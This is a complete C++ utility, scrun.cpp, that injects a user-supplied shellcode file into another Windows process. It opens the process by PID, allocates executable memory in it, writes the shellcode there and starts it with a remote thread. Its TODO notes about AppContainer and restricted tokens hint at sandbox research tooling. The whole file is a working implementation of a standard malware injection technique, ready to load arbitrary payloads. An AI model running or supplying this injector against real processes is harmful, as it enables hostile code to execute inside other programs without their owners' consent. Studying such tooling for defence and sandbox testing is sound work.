/*
* scrun.cpp - injects shellcode
* Author : Marche147 [bitmarche@gmail.com]
* Description :
*/

/*
TODO :
FIX AppContainer
Add Restricted token option

*/

#pragma warning(disable:4005)	// MACRO REDEFINITION

#include "../CommonLib/common.h"
#include <ntstatus.h>
#include <list>
#pragma comment(lib, "../x64/Release/syscall.lib")
#pragma comment(lib, "../x64/Release/CommonLib.lib")



void usage(char* arg)
{
	printf("usage : %s <pid> <shellcode_bin>\n", arg);
	return;
}

char* readfile(char* filename, long* filelen) {
	FILE* fp = NULL;
	char* result = NULL;
	long len;

	fopen_s(&fp, filename, "rb");
	if (!fp)		return NULL;
	fseek(fp, 0, SEEK_END);
	len = ftell(fp);
	*filelen = len;
	fseek(fp, 0, SEEK_SET);
	result = (char*)malloc(len);
	if (!result) {
		fclose(fp);
		return NULL;
	}
	fread(result, 1, len, fp);
	fclose(fp);
	return result;
}

int main(int argc, char* argv[])
{
	HANDLE hProcess = NULL;
	long length = 0;
	LPVOID addr = NULL;
	SIZE_T written;
	HANDLE hRemoteThread = NULL;
	DWORD tid;
	DWORD exitcode;

	if (argc != 3) {
		usage(argv[0]);
		return 0;
	}

	DWORD pid = atoi(argv[1]);
	char* filename = argv[2];
	char* buffer = readfile(filename, &length);
	
	if (!buffer) {
		printf("Cannot read file,.\n");
		return -1;
	}
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess) {
		printf("Cannot open process. %d\n", GetLastError());
		goto end;
	}
	addr = VirtualAllocEx(hProcess, NULL, ROUNDUP(length, PAGE_SIZE), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!addr) {
		printf("Cannot allocate remote memory. %d\n", GetLastError());
		goto end;
	}
	if (!WriteProcessMemory(hProcess, addr, buffer, length, &written)) {
		printf("Cannot write process memory. %d\n", GetLastError());
		goto end;
	}
	hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &tid);
	if (!hRemoteThread) {
		printf("Cannot create remote thread. %d\n", GetLastError());
		goto end;
	}
	if (WaitForSingleObject(hRemoteThread, INFINITE)) {
		GetExitCodeThread(hRemoteThread, &exitcode);
		printf("Exit code = %d\n", exitcode);
	}

end:
	if (addr)	VirtualFreeEx(hProcess, addr, 0, MEM_RELEASE);
	if (hProcess)	CloseHandle(hProcess);
	if (hRemoteThread)	CloseHandle(hRemoteThread);
	return 0;
}